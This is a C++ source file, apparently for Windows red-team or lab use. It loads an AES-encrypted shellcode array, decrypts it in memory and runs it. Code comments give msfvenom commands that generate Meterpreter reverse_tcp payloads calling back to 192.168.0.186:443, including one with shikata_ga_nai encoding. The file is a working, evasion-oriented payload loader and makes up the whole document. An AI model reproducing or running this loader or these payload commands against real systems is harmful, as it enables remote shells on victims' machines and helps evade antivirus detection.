#include "Windows.h"
#include <iostream>
#include <fstream>
#include "aes.h"
#include "shellcode.h"

#pragma warning(disable : 4996)

void AES256Decrypt(uint8_t* toDec, uint8_t* IV, const char* Key, size_t Size)
{
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, Key, IV);
	AES_CBC_decrypt_buffer(&ctx, toDec, Size);

	memcpy((char*)toDec + Size, "\x00", 1);
}

// Calc launcher - msfvenom -p windows/exec CMD=calc.exe -f C
// msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.186 LPORT=443 -f c --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.186 LPORT=443 EXITFUNC=thread -f c -e shikata_ga_nai

#define IV "1234567890123456"
#define KEY "12345678901234567890123456789012"

int main()
{
	size_t size = sizeof(shellcode);
	DWORD op = 0;

	LPVOID payload = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payload) {
		RtlZeroMemory(payload, size);
		RtlMoveMemory(payload, shellcode, size);
	}
	else return 0;

	// Debug pause prior to decryption of AES shellcode
	printf("[*] Debug Pause\n");
	getchar();

	AES256Decrypt((uint8_t*)payload, (uint8_t*)IV, KEY, size);

	if (VirtualProtect(payload, size, PAGE_EXECUTE_READ, &op)) {
		((void(*)())payload)();
	}

	VirtualFree(payload, size, MEM_RELEASE);
	return 0;
}